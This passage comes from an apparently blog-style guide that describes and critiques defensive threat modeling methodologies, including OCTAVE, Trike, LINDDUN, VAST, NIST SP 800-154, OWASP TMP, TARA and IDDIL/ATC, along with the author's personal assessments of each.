Information Process 6: Perform Infrastructure Vulnerability Evaluation Phase 3: Strategy and Plan Development - Calculate risk by analyzing gathered assets, threats and vulnerabilities. Produce a prioritized list of risks, a protection strategy and a risk management plan. Process 7: Conduct Multi-Dimensional Risk Analysis Process 8: Develop Protection Strategy ** Note: I may re-visit this section in the future to add additional depth, but for now I have left it pretty bare-bones. I‚Äôve done this because I really don‚Äôt care for this methodology. Thoughts on OCTAVEWith OCTAVE, there is a heavy emphasis in Phase 1 on meticulous and (overly) exhaustive knowledge gathering from across the enterprise. Senior managers, operational managers and rank-and-file staff are all consulted. Though I believe any good threat modeling approach will leverage system owners / organizational stakeholders to describe their systems and discuss the threats / risks / controls that exist within the target system from their perspective, OCTAVE seems to rely exclusively on these system owners rather than dedicated security staff. Though these system owners surely possess authoritative knowledge about their own system(s), they lack the security depth to be effective in providing a meaningful list of threats and security controls. The goal for Phase 1 of an OCTAVE engagement is to establish security requirements. Personally, I think security requirements should be an input into a threat modeling exercise, rather than an output or goal. Requirements are not really system-specific, rather they should be adopted organization-wide then used to influence and provide boundaries for subsequent threat models. With that said, I see the benefits of using OCTAVE in the nascent stages of information security program development as a way to define threat / risk-informed security requirements. One thing OCTAVE nails in my mind is the exercise of identifying high-priority components within the target system. Once determined, denote these components within the larger asset map to better understand critical attack paths. In Process 6 of OCTAVE, ‚ÄúPerform Infrastructure Vulnerability Evaluation‚Äù, the assessment team is tasked with selecting intrusion scenarios. This is to be done based solely on previously gathered characteristics of the enterprise but makes no mention of using actual threat intelligence. This is a huge blind spot in my opinion. Sure, you can certainly speculate (and wildly so) as to all of the potential intrusion scenarios in an environment but having an intel-informed approach will yield much better risk-driven results in the end. Overall, I find OCTAVE tedious, complex and confusing, especially when applied in a more tactical threat modeling sense as its highly prescriptive set of steps is undeniably time-consuming. But don‚Äôt take it from me, the SEI team themselves say as much in a subsequent (more simplified) OCTAVE release‚Ä¶ ‚ÄúFinally, given the size and complexity of the OCTAVE method, it is easy to imagine that some organizations have significant challenges in embracing and using the OCTAVE approaches. Absorbing hundreds of pages of process documentation, understanding the accompanying worksheets and how to use them, and collecting and organizing the needed data can be challenging tasks. Upon reflection, the sheer volume of data collection is an impediment for some organizations in moving forward with performing the tasks of analyzing and mitigating risks. A streamlined process that reduces ambiguity and is more structured may be more applicable to the needs of organizations that find the existing OCTAVE methods too cumbersome to use. ‚Äù To OCTAVE‚Äôs credit however, I don‚Äôt consider it exclusively a system threat modeling methodology, rather one that is wrapped in a larger risk assessment / management model and meant to evaluate an organization as a whole rather than targeting a specific system. After all, it is defined as a framework for identifying and managing information security risks. When you start to delve into the risk ‚Äúmanagement‚Äù side of things, you start to tread beyond the more limited-scoped responsibilities of typical threat modeling. OCTAVE-S: OCTAVE-S is a (mildly less complex) variation of OCTAVE classic, (published in 2003) tailored to constrained, less hierarchical organizations. It is meant to be conducted by a small team (3-5 people) of inter-disciplinary individuals with broad knowledge of the organization. In reality, it‚Äôs pretty much the same process (with the same flaws) and with only two notable differences. OCTAVE-S assessments are conducted by a small team rather than having expansive, formal workshops across the organization interviewing all managers and technical staff. This potentially helps reduce some overhead but the data needed as input(s) across all the phases does not materially change (with the exception of the bullet below). Exclusion of technical vulnerability data in favor of evaluating higher-level secure configuration processes. The expectation is that smaller organizations outsource or otherwise have abstracted processes which would limit the ability (or need) to gather this more granular vulnerability data. OCTAVE Allegro: OCTAVE Allegro (circa 2007) is the final distillation of the original OCTAVE methodology, the goal of which is to produce more robust results without the need for extensive risk assessment knowledge. In other words, it more closely resembles an actual threat modeling process and less-so a comprehensive risk assessment framework. The process flow for OCTAVE Allegro is depicted below. Thoughts on OCTAVE AllegroIt‚Äôs great that the OCTAVE team realized that OCTAVE and OCTAVE-S were overly cumbersome and I think the Allegro variant is a decent model with some worthwhile bits. With that said, it ultimately would not be my threat modeling scheme of choice in any context. OCTAVE Allegro introduces some over-indulgent concepts such as information ‚Äúcontainers‚Äù and ‚Äúenvironment maps‚Äù. The environment map seeks to capture all places (what they refer to as containers) where an ‚Äúasset‚Äù is stored / transported / processed and must then be classified as ‚Äútechnical‚Äù, ‚Äúphysical‚Äù or ‚Äúpeople‚Äù. I‚Äôm not saying there is no security value in capturing this level of detail, just that it is overly-involved and has low RoI. Risk Measurement CriteriaOne aspect of OCTAVE Allegro I think is unique and pretty useful is the concept of defining risk measurement criteria. I think this criteria is something that should be established at an organization-wide level, rather than attributed to a specific threat model, but nevertheless this concept has real value. One of the hardest aspects of threat modeling and more broadly, risk assess-ing is understanding and calculating true business risk / impact. By taking the time to formally develop risk measurement criteria, you will ultimately be more successful in creating truly risk-prioritized outcomes from your threat modeling assessments. Some examples of risk categories from OCTAVE Allegro are listed below. Reputational / customer confidence (e. g. customer loss, brand degradation) Financial (e. g. operating costs, revenue loss, one-time loss) Productivity (e. g. staff hours) Safety and health (e. g. life, health, safety) Fines / legal penalties (e. g. fines, lawsuits, investigations) or a User-defined impact areaTrike: Trike (circa 2006) is a unified, conceptual framework for security auditing from a risk management perspective through the generation of various models. Trike‚Äôs distinguishing features are its high level of automatability, defensive-focus and purpose-built (open-source) Trike tool. The Trike v. 1 threat modeling process is defined by its 4 distinct modeling phases (listed below). 14 Trike Modeling Phases Requirements Model Implementation Model Threat Model Risk ModelTrike Requirements Model: A Trike threat model begins by first building the requirements model. To do so, the following inputs are needed. Understanding of what the system is intended to do at a high level (i. e. an application profile). The Actors (human) who are interacting with the system. The Assets that actors interact with. Assets are discrete data entities or physical objects with inherent value within the system. The (business-defined) intended actions that are taken by said actors. Actions can be decomposed via CRUD (i. e. ‚Äúcreate‚Äù, ‚Äúread‚Äù, ‚Äúupdate‚Äù and ‚Äúdelete‚Äù). Unintentional behavior is not included within the requirements model. The Rules that exist within the system to constrain an actors actions. Rules for an action are a set of declarative sentence fragments connected by logical connectives (‚Äúand‚Äù, ‚Äúor‚Äù and ‚Äúnot‚Äù). These inputs are ultimately expressed in a tabular format referred to as an actor-asset-action matrix (AAA). In an AAA matrix, columns are assets, rows are actor roles and cells are quad-divided for each C-R-U-D action. Each respective action-cell can be set to allowed, disallowed or action with rules. An example of what this matrix could look like is provided below. Access Control MatrixAn actor-asset-action-matrix is also referred to as an access control matrix. The Trike help spreadsheet can be download here. (Warning: It is a truly unwieldy beast. ) You can download my actor-asset-action matrix file here. Trike Implementation Model: Once the requirements model has been defined, a data flow diagram (DFD) should be created. Within the DFD, other implementation details should be captured such as: Process technologies (e. g. OS, libraries, platforms, versions, etc‚Ä¶) Data store type (e. g. file store, database, registry entry, version info, etc‚Ä¶) Data flow protocols and directionality Trust boundaries and what enforces them Other security technologies and where they are used (i. e. encryption, authentication, authorization, firewalls, certificates, passwords, etc‚Ä¶)With the DFD in-hand, we begin creating / layering use flows by taking each action defined in the system requirements model and tracing that action‚Äôs path through the DFD. Use flows are broken into segments when traversing an external interactor (this includes when traversing a user). * Use flows are an experimental feature of Trike. Use Flow Map* Note: In a future update to this guide, I will provide details and a depiction of a Use Flow map in a threat modeling context. Stay tuned! Trike Threat Model: To build a Trike threat model, we begin with threat generation. Within Trike, threats are defined as anything more or less than the intended actions. Threats are always events rather than specific (threat) actors. Threats within a system are purely deterministic, given the actor-asset-action matrix. In other words, given a static matrix, the same set of threats should be generated regardless of who is running the exercise. The threat taxonomy for Trike is extremely simple, with only two categories - Denial of Service (DoS) and Elevation of Privilege (EoP). Let‚Äôs contrast this to the threat taxonomy first introduced by STRIDE. Spoofing: Trike considers spoofing an ‚Äúattack‚Äù rather than a threat in most cases. However you slice it, Trike equates spoofing to a (Type 2) EoP whereby an actor is able to violate a rule. Tampering &amp; Information Disclosure: Both are also considered instances of (Type 2) EoP within Trike. Denial of Service (DoS): When a legitimate action is denied. One DoS threat is generated for each intended action. Elevation of Privilege (EoP): Type 1: When an actor performs an action which no actor is intended to perform on an asset. Type 2: When an actor performs an action on an asset despite the rules for that action. Type 3: When an actor uses the system to perform an action on some other system‚Äôs asset (i. e. the ‚Äúsocial responsibility‚Äù threat). From here, attack trees should be generated for threats. * Trike recommends trees be expanded only to the point where there is enough information to reasonably decide whether the risk caused by the threat has been reduced to an acceptable risk level. This will limit the overhead of having to complete an entire tree for every. single. threat. Trike Risk Model: Trike employs a quantitative approach to risk modeling, and describes it as ‚Äúhighly experimental‚Äù. As with everything in the Trike world though, it is quite formal and explicitly defined. To perform the Trike risk model, we calculate impact &amp; likelihood as defined below. Trike Impact Calculation First, assign all assets within the defined system a dollar ($) amount based on its inherent business value. On a scale from 1-5 (5 being the most undesirable), rank each defined action-to-asset pair (this is a qualitative measure). Each pair should be ranked twice: (1) For when an authorized action cannot be completed in accordance with the rules (i. e. the DoS threat impact/exposure metric), and‚Ä¶ (2) For when an attacker completes an action despite the rules which disallow it (i. e. the EoP threat impact/exposure metric) On a scale from 1-5 (where the most untrusted (likely anonymous) is a 5), rank each actor within the defined system. Now with these inputs, we can create an exposure value for each threat. The exposure calculation is the value of the asset multiplied by the action-specific threat impact score. Trike Likelihood CalculationHaving completed the attack tree(s) in the threat modeling phase, we should now have a catalog of discovered weaknesses &amp; vulnerabilities. The second step (probability calculation) of Trike‚Äôs risk modeling approach is to take each weakness / vulnerability and rank them on three separate scales (again from 1-5). Reproducibility: How easy a given weakness is to reproduce. Exploitability: How technically easy an attack is to conduct. Actor Risk: The risk value attached to the least trusted actor who is able to target the weakness (this was calculated in Step 3 of the impact calculation). * While performing these rankings, consider the mitigations that currently exist along the identified attack paths and whether those mitigations reduce the score(s). (see QTMM, Stage 5) With these three scores, we can now calculate the final probability of a weakness by multiplying all three subscores. * Trike defines an additional process for further calculating vulnerability probability by examining parallel success paths in the attack tree, but for the sake of this write-up we will forgo explaining this. OK! Now that we have both the impact and likelihood scores, we can calculate the final risk score by multiplying everything together. For each threat, simply use the highest calculated applicable vulnerability risk. An example of what this risk calculation might look like is provided below. It‚Äôs very involved as you can see. As you scale assets and actors, the calculations can grow geometrically‚Ä¶ I‚Äôve provided my sample risk calculator spreadsheet here. Thoughts on Trike: Though not perfect, overall I like Trike. Its defensive-focused approach coupled with its highly formalized nature make it fairly unique in the threat modeling space. Below, I provide a list of other incongruous thoughts about Trike. Despite what the authors say - ‚ÄúTrike was built to bring efficiency and effectiveness to existing threat modeling methodologies‚Äù - I‚Äôm not sure how you cleanly apply this methodology as an overlay to others. As I spend more time with it, my feelings on this may soften, but I expect the highly formalized nature of Trike to not blend so well with other methodologies. Much like VAST, automation &amp; scalability are key. Unlike VAST though, Trike does not dispense with the consultation of actual security experts (phew!). Somewhat counterintuitively, Trike doesn‚Äôt require knowledge of, or establishment of, a dedicated CTI source for generation of threats. Instead, threat generation is formed in a ‚Äúdefensive‚Äù manner by simply defining exactly how the system should work and designating anything not defined as a threat. The problem with building a complete state-machine model (which is what Trike prescribes) for a given system is that to do so, it is (very likely) a complex and time-consuming effort as the scope of your target system expands. With that said, if you can achieve a well-defined state-machine for the target system, you gain a very pure level of repeatability when it comes to performing automated threat models. Simply feed the same inputs in (attack library, implementation model, etc‚Ä¶) and you‚Äôll get the same outputs! The Trike authors claim the framework / tool is under heavy development but evidence is to the contrary. Their last published talk was in 2012, the last update for their tool (hosted on SourceForge of all places - but now points to GitHub) was in 2019 and the FAQ suggested a v2 of the tool would be released (maybe) in 2013. (It‚Äôs 2022 and still no v2‚Ä¶) Some of the more detailed, systematic sub-processes of Trike are particularly‚Ä¶ not-human-friendly. See Section 2. 1 of the Trike v. 1 white paper to see what I mean. Of course this is where the tool comes into play. I wouldn‚Äôt recommend hand-jamming a Trike threat model to the letter‚Ä¶ very sweaty. There are a number of other author-stated capability gaps within Trike‚Ä¶ No support for the creation of DFDs. Attack trees are not auto-generated. Trike doesn‚Äôt come preloaded with a managed attack library. LINDDUN: LINDDUN (circa 2010) is a privacy-focused + threat-based, threat modeling methodology. The LINDDUN privacy engineering framework provides a systematic approach to identifying privacy threats in software systems. This methodology consists of 3 fundamental steps (depicted below). 15 Step 1: Model the system - LINDDUN relies on a traditional data flow diagram to model the system. Step 2: Elicit threats/risks - Each element (e. g. entity, data store, data flow and process) within the model should be analyzed for potential threats. A 2-dimensional matrix (i. e. mapping table) is built, denoting (i. e. with an ‚ÄòX‚Äô) which components have potential threats across each of the 7 threat categories. For each X in the generated table, a threat tree (similar to an attack tree, see Step 2C. Document threats of the LINDDUN framework) can be created to determine likely attack paths. The 7 privacy threat categories (linked to their respective threat tree catalogs) are listed below. 16 LINDDUN Threat CategoriesThe threat categories below represent 7 distinct privacy-oriented issues that may be found within a system. (These resemble the QTMM PPGs). Linkability: An adversary is able to link two items of interest without knowing the identity of the data subject(s) involved. (Desired Property: Unlinkability) Identifiability: An adversary is able to identify a data subject from a set of data subjects through an item of interest. (Desired Property: Anonymity / pseudonymity) Non-repudiation: The data subject is unable to deny a claim. (Desired Property: Plausible deniability) Detectability: An adversary is able to distinguish whether an item of interest about a data subject exists or not, regardless of being able to read the contents itself. (Desired Property: Undetectability / unobservability) Disclosure of information: An adversary is able to learn the content of an item of interest about a data subject. (Desired Property: Confidentiality) Unawareness: The data subject is unaware of the collection, processing, storage, or sharing activities (and corresponding purposes) of the data subject‚Äôs personal data. (Desired Property: Content awareness) Non-compliance: The processing, storage, or handling of personal data is not compliant with legislation, regulation, and/or policy. (Desired Property: Policy and consent compliance)Step 3: Manage threats - Threats should be prioritized via risk assessment (one of your choosing, as LINDDUN does not prescribe a specific framework) and mitigations should be selected (LINDDUN so graciously provides a mitigation strategy taxonomy). Thoughts on LINDDUNLINDDUN is cleanly documented, simple and unique. It is purpose-built for the increasingly-important world of privacy. It doesn‚Äôt seek to reinvent the wheel, instead leaning on widely adopted strategies for modeling systems (DFDs), mapping attack paths (attack trees) and prioritizing findings. The LINDDUN team provides easy-to-use resources, threat tree libraries, mitigation catalogs and literally everything else you would need to be successful in conducting a privacy-oriented threat model. VAST: Visual, Agile and Simple Threat (VAST) modeling is an abstract methodology from the team at ThreatModeler. VAST is keenly focused on scalability, which in this context can be described as the use of automation, integration and collaboration to perform threat modeling in an Agile practice. Other important tenants of VAST include providing a self-service model that does not rely on dedicated security expertise, as well as one that will produce valuable, actionable outputs for inter-disciplinary stakeholders. To visualize security concerns at both the application and infrastructure layers, VAST leverages two different types of threat modeling styles - application threat models and operational threat models. Application modeling focuses on the application itself using process-flow diagrams while operational modeling goes beyond the application, visualizing the interconnected infrastructure in which the application resides using traditional data-flow diagrams (DFDs). Examples of these two modeling techniques are provided below. 17,18 Application Threat ModelDepicted below is an Application Threat Model, visualized using a process-flow diagram. 18 Operational Threat ModelDepicted below is an Operational Threat Model, visualized using a data flow diagram (DFD). 18 Principles of VASTThe essential ingredient for ThreatModeler‚Äôs version of VAST is of course their commercial tool which comes preloaded with a proprietary threat library and is capable of performing automated threat modeling. In a more abstract sense, VAST can be thought of less as an actual threat modeling methodology and more-so as a set of principles by which other threat modeling methodologies should strive toward. These principles very transparently being‚Ä¶ Visual: Leverage multiple visualization techniques such as ‚Äúapplication‚Äù and ‚Äúoperational‚Äù modeling to best understand and document assets, data flows, threats and ultimately, risks from a variety of perspectives. Agile: VAST requires the use of a tool (such as ThreatModler‚Äôs tool, but doesn‚Äôt necessarily have to be) that is easily automatable within a DevOps pipeline. This provides scalability and consistent repeatability. Simple: Simplicity is key, as complexity hinders repeatability and scalability. As we know from our review of OCTAVE, having an overly thorough process is not necessarily a benefit. Threat: Threats are the name of game! By focusing on threats, we most effectively determine true risks to a system. Thoughts on VASTThe efficacy of VAST in the context of its implementation via the ThreatModeler tool is not something I can speak to, as evaluating it would require access to, and experience with the ThreatModeler tool itself. With that said, I think a model which abides by the VAST principles, can be done at scale, can be performed by anyone, and in the end, yield actionable results, is about as ideal of a form that a threat modeling methodology can take. Sure, VAST may not produce the same depth of findings, or the perfectly prioritized list of risks that some of the other methodologies might, but what good are those other methodologies if they are too cumbersome (looking at you OCTAVE) to use at scale? Threat Modeling Methodology ComparisonBelow you can see ThreatModeler‚Äôs take on how different, popular threat modeling methodologies compare (which I think is a pretty genuine, mostly unbiased attempt). 17 Data-Centric System Threat Modeling, NIST SP 800-154: NIST Special Publication 800-154: Guide to Data-Centric System Threat Modeling , published by the National Institute of Standards and Technology (i. e. NIST), describes threat modeling as, ‚Äú‚Ä¶a form of risk assessment that models aspects of the attack and defense sides of a particular logical entity, such as a piece of data, an application, a host, a system, or an environment. ‚Äù This particular guide to threat modeling focuses on protecting data rather than systems, and is meant to define a set of principles that other methodologies could also adopt. Below, I have briefly summarized the steps of this threat modeling methodology. 21 Data-Centric System Threat Modeling StepsThis section contains the steps for conducting a data-centric threat modeling exercise (per NIST SP 800-154, Section 4). 21 Step 1: Identify and characterize the system and data of interest. Authorized data locations - For all data of interest, document where data is stored, how data is transmitted, in what environments data is processed, how data is input into the system and finally, how data is output from the system. Security objectives - What are the confidentiality, integrity and availability (CIA) requirements for the data within the system? Authorized actors - What people and processes have an authorization-level high enough to affect the security objectives? Step 2: Identify and select the attack vectors to be included in the model. Attack vectors in this methodology can be described as content (typically malicious) from a source (i. e. web site) acted upon by a processor (i. e. web browser). An attack vector example given in the publication is, ‚ÄúMalicious web page content (content) downloaded from a web site (source) by a vulnerable web browser (processor). ‚Äú Step 3: Characterize the security controls for mitigating the attack vectors. i. e. , for each attack vector from Step 2‚Ä¶ Identify a (feasbile) mitigating control. Evaluate assumed effectiveness of the selected control. Estimate negative implications (e. g. cost, usability/performance degradation, LoE, etc‚Ä¶) of implementing that control. Step 4: Analyze the threat model. The guide timidly suggests a couple of risk scoring approaches in this final step, none of which I think are worth regurgitating here. Essentially, (as is similarly done with many other methodologies) we want to take some combination of data criticality, attack vector likelihood / impact and control effectiveness, across all pairings and begin prioritizing risk treatments. Thoughts on the Data-Centric Approach by NISTThis methodology introduces some novel-ish concepts, and though it is notably light in some areas with respect to executing a data-centric threat modeling exercise, my verdict is that it‚Äôs a worthy addition to the overall methodology lineup. Below I‚Äôve listed an assortment of other thoughts about what NIST put together. 21 NIST SP 800-60 (and inherently FIPS PUB 199) are specifically recommended as a supplemental guides for facilitating the categorization &amp; mapping of data. This is a critical pre-Step 1 action. I really like the data characteristics that this methodology asks us to identify in Step 1, but it is very light on how to actually inventory / identify that data. This is of course the hard part. I can appreciate the thought that went into the syntactic attack vector generation approach this methodology puts forth, but I think describing all attacks as content + source + processor is rather tedious and oddly patronizing. This methodology caters towards the data-obsessed. I think this heavy focus on data security has certain merits, as in many cases a threat actor‚Äôs intended impacts are indubitably data-specific - but, there are many system-specific attacks that have less to do with data that would still translate to high risk for a business. For this reason I don‚Äôt recommend going all-in on a data-only approach to threat modeling. Putting meaningful thought into the negative implications of each suggested control is an underrepresented part of the controls conjuration step of other threat modeling methodologies. Of course this should be done! After all, it‚Äôd be too easy to just unplug all our computers and throw them into the ocean - no hackers getting our data now, right?! But this just isn‚Äôt a feasible option. It‚Äôs clear that the authors (Murugiah Souppaya, NIST and Karen Scarfone, Scarfone Cybersecurity) ran out of creative juices when they got to Step 4. They call this final step, ‚ÄúAnalyze the threat model‚Äù and then proceed to suggest a couple half-baked (‚Äúhalf‚Äù being very generous) scoring approaches for findings. ‚ÄúAnalyze‚Äù is a pretty generic term - perhaps what they meant is risk model? In any case, what they suggested is pretty weak. OWASP Threat Modeling Process: OWASP has a published Threat Modeling Process (a. k. a. ‚ÄúTMP‚Äù) which consists of 3 (very familiar) steps. Their methodology borrows pretty heavily from the more well-established players (i. e. PASTA &amp; Microsoft) and is unsurprisingly web application-specific. I think OWASP‚Äôs own write-up is fairly to-the-point so I‚Äôll only provide a condensed version of the steps below. 22 OWASP TMP StepsThis section describes the steps for conducting an OWASP TMP exercise. OWASP also provides a playbook to assist with an assessment. 22 Step 1: Decompose the Application Construct an application profile (remember from PASTA?) - include application name, version, description, etc‚Ä¶ Inventory and uniquely assign IDs to system components including external dependencies, entry/exit points (interfaces to/from the app), assets (potential targets) and trust levels (privileges required to interact). Produce a data flow diagram (DFD). Step 2: Determine and Rank Threats Select your preferred threat classification framework. OWASP uses STRIDE, but in theory, other frameworks could be subbed in. The authors also reference the ‚ÄúASF‚Äù or Application Security Frame, which is another set of threats (and corresponding controls) sourced from the OWASP Code Review Guide. Perform threat analysis (should remind you of PASTA again) by generating threats tied to components/flows within the modeled system. To facilitate this process, consider using threat trees and/or use/abuse flows. Rank threats provided known risk factors using a risk assessment/scoring model such as DREAD (which is what OWASP suggests). Step 3: Determine Countermeasures and Mitigation Map corresponding countermeasures to identified threats using an appropriate controls framework. Once mapped, determine residual risk. For example, resulting risks could simply be defined as being ‚Äúnot mitigated‚Äù, ‚Äúpartially mitigated‚Äù or ‚Äúfully mitigated‚Äù. Thoughts on OWASP‚Äôs TMPAlright! So here‚Äôs my list-based take on OWASP‚Äôs TMP‚Ä¶ I like the focus / inclusion of dependencies as a potential attack vector / input interface. Gives me supply chain attack vibes, which is all the rage these days. This methodology emphasizes the concept of entry points (and to a lesser degree exit points). By understanding how/where an attacker can interface with a system we can better determine threats/attack paths. Oh yeah! Threat trees are back. This concept of an ‚ÄúASF‚Äù (Application Security Frame) has popped up in a few threat modeling methodologies now (1, 2, 3). It is a concept I was not that familiar with prior to this research, but will more carefully consider moving forward. Oh no, STRIDE and DREAD are getting more stage time, how dreadful! 28 OWASP sure doesn‚Äôt strain themselves coming up with a process for calculating residual risk. Just leverage an existing methodology, they say. ID‚Äôing elements (i. e. dependencies, entry points, assets, trust levels) within the DFD is awesome and looks great. TARA: Threat Assessment and Remediation Analysis (TARA) , designed by MITRE in 2014 (not to be confused with Intel‚Äôs TARA), is described as, an engineering methodology used to identify and assess cyber vulnerabilities and select countermeasures effective at mitigating those vulnerabilities. What makes TARA unique is its application of a (self-managed) catalog of controls-to-attack-vectors and its strategies for applying specific countermeasures based on specified risk tolerance. 23 TARA Assessment WorkflowThis section details the TARA assessment process flow, as well as the actions within each of the 3 distinct phases of the methodology. Step 1: Cyber Threat Susceptibility Analysis (CTSA) Compile technical details to build a cyber model of the system. This is effectively an application profile (similar to PASTA:1, Trike:Req and OWASP:1). This methodology also recommends using a Crown Jewels Analysis (a. k. a. ‚ÄúCJA‚Äù) as input into this step. Search the managed threat catalog for plausible attack vectors based on the now-documented architecture. Perform a threat-based risk assessment. TARA suggests a simple, qualitative risk model such as the ‚ÄúRisk Cube‚Äù (i. e. , impact x likelihood). The output of the risk assessment is a vulnerability matrix which contains a list of (ID‚Äôed) attack vectors with corresponding risk scores. Step 2: Cyber Risk Remediation Assessment (CRRA) Vulnerabilities (from the vulnerability matrix) are mapped to countermeasures sourced from the managed controls catalog. The TARA Catalog consists of a series of attack-to-control pairings which are described as 3-tuples of the form, &lt;Countermeasure ID, Attack vector ID, Countermeasure effect&gt;, where the effect is ‚Äúpreventative‚Äù (P) or ‚Äúmitigating‚Äù (M). An analysis is performed to estimate the utility and cost of each control-to-attack pair which ultimately yields the mitigation mapping table. This table is essentially the first 5 rows of the matrix depicted below. A holistic countermeasure selection strategy is developed by evaluating the solution effectiveness table (depicted below). Step 3: Knowledge Management (KM) Extract applicable attack vectors from open (or closed) source cyber threat libraries (i. e. CAPEC &amp; CVE). Further bolster managed TARA Catalog content to reflect changing landscape of known threats and respective countermeasures. Thoughts on TARAA collection of my thoughts about TARA are listed below. This methodology introduced me to the MORDA risk assessment model. Fun! TARA is not rigid, allowing swappable forms of risk ranking, attack generation, utility/cost scoring, etc‚Ä¶ The methodology was purpose-built for achieving mission assurance (MA) during a federal acquisition process. The official TARA white paper claims ‚ÄúOver a dozen TARA assessments have been conducted since 2011‚Ä¶‚Äù. This paper was published in 2014‚Ä¶ So, only slightly over a dozen TARA assessments in a 3-year timespan? Yikes! TARA calls on YOU to maintain an up-to-date threat-to-control catalog. This is incredibly difficult to manage without a full team dedicated to the pursuit. Given this is the standout feature of the methodology, I think it‚Äôs what cripples it. IDDIL/ATC: IDDIL/ATC is a threat-driven threat modeling approach developed by Lockheed Martin in 2019. A security strategy which is driven by compliance or through implementation of a pre-canned list of controls is doomed to fail in the face of a realistic slate of threats. It is on this basis that this methodology eschews compliance and any emphasis on merely addressing vulnerabilities and instead favors mitigating true threats. IDDIL/ATC stands for ‚ÄúThere are no idle threats - they attack‚Äù and consists of two distinct phases. 24 Phase 1: Discovery (IDDIL) Phase 2: Implementation (ATC)IDDIL/ATC was also designed to integrate cleanly with a typical software engineering lifecycle (SDL). This is demonstrated via the graphic below. IDDIL/ATC Discovery Phase (IDDIL): This section describes the initial phase of the IDDIL/ATC methodology. The 5 steps of this phase correspond with ‚ÄúIDDIL‚Äù. 24 Identify the Assets: Identify business-critical assets as well as assets attackers may be uniquely interested in. Define the Attack Surface: Determine attack surface by mapping macro-level components / elements of the system that contain, transmit or access assets. Essentially, produce a data flow diagram (DFD). Decompose the System: For all components and flows within the model, layer in technology information and information about security controls present within the overall system. (Reference the Trike Implementation Model) Identify Attack Vectors: Leverage vulnerability catalogs and attack libraries to document attack paths, for example, by using attack trees. To be successful here, a threat categorization system should be selected (or developed) to assist with modeling and analysis of threats. IDDIL/ATC suggests using a tweaked version of STRIDE, ‚ÄúSTRIDE-LM‚Äù which introduces the lateral movement threat category. As part of this threat categorization matrix, include a list of controls for each threat that provide some mitigating factor. (i. e. ‚ÄúI‚Äù in STRIDE is for information disclosure - an example control could be encryption. ) List Threat Actors &amp; Objectives: Leveraging CTI, develop a list of potential threat actors. It is suggested to create threat profiles for each asset / component of the system. A threat profile is a tabular summary which contains information like threat types, attack surface, attack vectors, threat actors, impacts, vulnerabilities, controls and other related information. To best understand the relationship between threats, assets and controls, reference the diagram provided below. Threats-Assets-Controls RelationshipIDDIL/ATC is a threat-driven methodology. To best understand how threats interact with assets and controls, we visualize their relationship as depicted below. 24 IDDIL/ATC Implementation Phase (ATC): This section describes the second (and final) phase of the IDDIL/ATC methodology. The 3 steps of this phase correspond with ‚ÄúATC‚Äù. 24 Analysis: Determine the impact of a successful compromise for each threat scenario (use a vulnerability scoring tool like CVSS). Assessment &amp; Triage: Produce a business / mission-prioritized list of findings based on the evaluations of threats (conducted in the first step of this phase). A risk assessment model may be beneficial to help with the analysis &amp; assessment from this and the previous step. Controls: Select and implement security controls to prevent/mitigate threats. A simple control taxonomy that IDDIL/ATC presents is - inventory, collect, detect, protect, manage and respond. To further understand the tools and practices employed to identify and implement controls as part of IDDIL/ATC, reference the following section. IDDIL/ATC Controls ImplementationIDDIL/ATC includes a number of tools and practices, purpose-built to facilitate the selection, implementation and evaluation of security controls and their effectiveness (further detailed below). 24 Functional Controls Hierarchy (FCH) - The controls column in the threat categorization model chosen earlier corresponds to the portfolio of categorical controls located within the FCH. Alongside these controls is the high-level control function and the tools / capabilities an organization has implemented that possesses that security property (implementation). A sample record within an FCH is provided below. Function Category Implementation Effectiveness ** Detect Endpoint Signature Anti-Virus Partial A benefit of constructing and maintaining an FCH is the identification of duplicate controls within your organization. ** The ‚ÄúEffectiveness‚Äù field is reserved for the following, controls effectiveness matrix. Controls Effectiveness Matrix - An extension of the FCH, this matrix adds the ‚ÄúEffectiveness‚Äù field which captures the analysis of how effective a control is, mapped to a specific threat / attack vector within an organization. Effectiveness is recorded as ‚Äúfull‚Äù, ‚Äúpartial‚Äù, ‚Äúnone‚Äù or ‚Äúcomplete control gap‚Äù, whereby the final rating is reserved for situations where nothing exists within the matrix (and thus within the organization) for a particular control category. Controls Effectiveness Scorecard - Provides a ‚Äúdashboard‚Äù-like view of enterprise controls effectivness coverage where high-level control categories (e. g. detect, protect, etc‚Ä¶) are mapped to identified attack surface components (e. g. User, Network, OS, Storage, etc‚Ä¶). A scorecard is created for each identified attack use-case. This is depicted below. Architectural Rendering - Combined, the previous tools can be collectively used as inputs into the devlopment of a controls-laden architectural rendering. This diagram resembles a flow diagram whereby we map the relationship between attack surface entities, directional data flows and overlays where controls and attacks apply within the architectural visualization. Though not an exact replication of an architectural rendering, this threat model DFD from Synopsys is a similar representation, depicting components/assets, threats and controls, all in one visualization. Thoughts and Other Tid-Bits for IDDIL/ATC: Below I provide a few final parting thoughts and observations related to the IDDIL/ATC threat modeling methodology. IDDIL/ATC preaches a focus on practical and scalable integration within a standard engineering lifecycle while at the same time requesting the assessor manually build and maintain a series of controls matrices, potentially lengthy lists of threats/attack scenarios and generally produce a lot of documentation. Without a clear way to automate some of these steps (which this methodology does not cover), I don‚Äôt see this as being a particularly scalable methodology. An even heavier focus with this methodology is in leveraging threat data, threat categorization models (e. g. STRIDE, STRIDE-LM, Cyber Kill Chain) and other threat-focused tools (i. e. attack trees) to better determine risk and where effort should be spent. This quality of IDDIL/ATC is where it shines in my opinion. I too believe that by taking a truly threat-focused approach to security, an organization can more effectively mitigate risk. STRIDE-LM is a new concept for me. It‚Äôs just the normal STRIDE we all know and love but also includes ‚ÄúLM‚Äù which stands for lateral movement. The added desired security property is therefore segmentation / least-privilege. A worthy edition to STRIDE to say the least‚Ä¶ Despite this methodology not being as ‚Äúscalable‚Äù as the authors may suggest, I truly like this model and am surprised it has not been popularized more. It introduces valuable and novel concepts such as threat profiles, the FCH, controls scorecard and the architectural rendering. All of which I think could be valuable to produce as part of an ongoing internal threat modeling function. I wanted to make a quick note on the difference between a DFD produced early-on in the threat modeling lifecycle and the ‚Äúarchitectural rendering‚Äù that this model introduces in the final phase. I think they are very similar in nature and if anything the latter just contains additional context and layers for the identified threats and controls juxtaposed inline with the assets / components from the original model. Keep in mind, a DFD will only contain assets, components and data flows - not the controls and threat information that gets developed in subsequent steps/phases within this and other similar threat modeling methodologies. Hybrid Threat Modeling Method (hTMM): The Hybrid Threat Modeling Method (hTMM) is an approach to threat modeling, published by Carnegie Mellon‚Äôs Software Engineering Institute in 2018, that combines features from the following models - STRIDE, Security Cards and Persona non Grata. At a high level, hTMM consists of 5 distinct steps, further described below. 25 